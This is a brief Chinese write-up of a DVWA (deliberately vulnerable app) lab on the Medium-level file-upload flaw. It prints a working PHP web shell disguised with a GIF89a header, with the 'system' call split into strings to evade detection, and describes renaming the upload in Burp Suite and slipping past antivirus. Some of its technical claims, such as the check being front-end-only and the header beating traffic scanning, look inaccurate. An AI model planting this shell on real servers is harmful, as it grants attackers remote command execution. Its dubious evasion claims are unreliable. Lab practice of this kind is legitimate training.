# DVWA 文件上传漏洞（Medium）实战：前端绕过与流量免杀

## 1. 漏洞描述
DVWA Medium 级别在文件上传功能中，仅在前端使用 JavaScript 限制了后缀名，后端校验不严。

## 2. 攻击过程
- **环境准备**：在本地杀毒软件白名单目录下，构造带图片头的免杀木马：
  ```php
  GIF89a
  <?php $a="sys"."tem"; $a($_GET['cmd']); ?>
前端绕过：使用 Burp Suite 拦截上传请求，将 filename="hack.png" 修改为 shell.php，绕过前端验证。

绕过杀软：利用 GIF89a 文件头伪装成图片，成功绕过 Windows Defender 的流量查杀。

战果：<img width="1917" height="462" alt="image" src="https://github.com/user-attachments/assets/29d4c0fb-e929-4a33-8112-2063bd95cf70" />
